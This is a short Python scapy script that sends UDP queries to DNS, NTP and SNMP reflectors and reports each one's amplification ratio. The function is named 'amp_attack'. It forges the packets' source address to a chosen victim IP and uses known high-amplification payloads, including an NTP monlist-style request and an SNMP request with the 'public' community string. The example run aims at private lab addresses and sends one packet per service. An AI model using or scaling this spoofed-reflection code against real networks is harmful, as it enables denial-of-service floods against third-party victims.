from scapy.all import *
import random
import time

SERVICE_PORTS = {
    "DNS": 53,
    "NTP": 123,
    "SNMP": 161
}

def amp_attack(reflector, victim=None, service="DNS", port=None):
    service = service.upper()
    port = port or SERVICE_PORTS.get(service, None)
    if not port:
        raise ValueError(f"Unsupported or missing port for service: {service}")
    
    victim_ip = victim if victim else get_if_addr(conf.iface)

    if service == "DNS":
        query = IP(dst=reflector, src=victim_ip) / UDP(sport=RandShort(), dport=port) / \
                DNS(rd=1, qd=DNSQR(qname="example.com", qtype="A"))

    elif service == "NTP":
        query = IP(dst=reflector, src=victim_ip) / UDP(sport=RandShort(), dport=port) / \
                Raw(load=b'\x17\x00\x03\x2a' + b'\x00' * 44)

    elif service == "SNMP":
        snmp_payload = (
            b"\x30\x26\x02\x01\x01\x04\x06\x70\x75\x62\x6c\x69\x63\xa0\x19\x02\x04\x70\x69\x6e\x67\x02"
            b"\x01\x00\x02\x01\x00\x30\x0b\x30\x09\x06\x05\x2b\x06\x01\x02\x01\x05\x00"
        )
        query = IP(dst=reflector, src=victim_ip) / UDP(sport=RandShort(), dport=port) / Raw(load=snmp_payload)

    else:
        raise ValueError(f"Unsupported service: {service}")

    sent_size = len(bytes(query))
    print(f"[+] Sending {service} packet ({sent_size} bytes) to {reflector}")

    response = sr1(query, timeout=3, verbose=False)
    
    if response:
        received_size = len(bytes(response))
        print(f"[+] Received response of {received_size} bytes")
        amplification_ratio = round(received_size / sent_size, 2)
        print(f"[=] Amplification Ratio: {amplification_ratio}")
        response.show()
    else:
        print("[-] No response received")
        received_size = 0
        amplification_ratio = 0

    return {
        "service": service,
        "sent": sent_size,
        "received": received_size,
        "ratio": amplification_ratio,
        "response": response
    }

# Example usage for local testing (omit victim to send back to attacker)
if __name__ == "__main__":
    results = []
    results.append(amp_attack("192.168.56.2", service="DNS"))
    results.append(amp_attack("192.168.56.3", service="NTP"))
    results.append(amp_attack("192.168.56.4", service="SNMP"))

    print("\n\n--- Amplification Results Table ---")
    print(f"{'Service':<10} | {'Sent':<5} | {'Received':<8} | {'Ratio'}")
    print("-" * 40)
    for res in results:
        print(f"{res['service']:<10} | {res['sent']:<5} | {res['received']:<8} | {res['ratio']}")
